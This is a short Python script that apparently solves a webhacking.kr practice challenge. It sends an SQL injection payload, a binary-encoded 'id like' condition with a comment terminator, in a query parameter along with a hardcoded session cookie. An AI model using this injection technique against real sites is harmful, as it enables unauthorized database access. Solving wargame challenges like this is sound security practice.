import requests


url = "http://webhacking.kr/challenge/web/web-12/index.php"

params = {
	"no": "0) or id like 0b0110000101100100011011010110100101101110-- " # 
}

headers = {
	"Cookie":"PHPSESSID=b2f4afe01ffbb827e31f86bff992b61d",
	"Host":"webhacking.kr"
}

req = requests.get(url, params=params, headers=headers)
print req.content